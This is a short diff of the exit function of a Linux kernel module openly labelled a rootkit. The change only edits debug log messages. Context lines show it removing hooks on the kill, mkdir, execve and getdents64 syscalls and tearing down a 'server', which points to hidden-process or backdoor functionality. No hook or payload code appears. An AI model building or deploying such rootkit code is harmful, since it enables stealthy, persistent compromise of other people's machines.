@@ -36,15 +36,15 @@ static int __init ModuleInit(void) {
 }
 
 static void __exit ModuleExit(void) {
+	printk("[rootkit][core.c::ModuleExit] DEBUG    initiated rootkit removal\n");  //DEBUG
 	remove_hook(&sys_kill);
 	remove_hook(&sys_mkdir);
 	remove_hook(&sys_execve);
 	remove_hook(&sys_getdents64);
 	log_msg("[core.c::ModuleExit] removed all hooks\n");
 	remove_server();
-	printk("[rootkit][core.c::ModuleExit] DEBUG    server removed\n");
 	close_logging();
-	printk("[rootkit][core.c::ModuleExit] DEBUG    logging closed removed\n");
+	printk("[rootkit][core.c::ModuleExit] DEBUG    rootkit removed\n");  //DEBUG
 }
 
 module_init(ModuleInit);
